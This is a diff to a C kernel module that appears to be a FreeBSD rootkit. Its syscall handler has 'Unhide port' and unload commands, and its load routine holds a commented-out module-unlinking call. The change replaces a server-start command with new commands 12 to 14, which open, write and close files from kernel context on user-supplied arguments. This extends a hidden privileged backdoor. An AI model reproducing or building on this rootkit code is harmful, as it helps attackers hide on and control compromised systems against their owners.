@@ -19,6 +19,10 @@ static int main(struct thread *td, void *syscall_args) {
 
 	long resp;
 
+	long inl = 0;
+	long fdl = 0;
+	int fdi = 0;
+
 	switch(uap->command){
 		case 0:// Unload
 			break;
@@ -56,7 +60,19 @@ static int main(struct thread *td, void *syscall_args) {
 		case 11://Unhide port
 			break;
 		case 12:
-			start_server();
+			filewriter_openlog(td, &fdi, uap->args[0]);
+			uprintf("FD: %d\n", fdi);
+			break;
+		case 13:
+			filewriter_openlog(td, &fdi, uap->args[0]);
+			inl = strtol(uap->args[2], NULL, 16);
+			filewriter_writelog(td, fdi, uap->args[1], (int)inl);
+			break;
+		case 14:
+			fdl = strtol(uap->args[0], NULL, 16);
+			filewriter_closelog(td, (int)fdl);
+			break;
+
 		default:
 			break;
 	}
@@ -82,7 +98,7 @@ static int load(struct module *module, int cmd, void *arg) {
 
 	switch (cmd) {
 		case MOD_LOAD:
-			//mod_unlink(module, cmd, arg);
+			// mod_unlink(module, cmd, arg);
 
 			snprintf(buf, 256, "%d\n", offset);
 
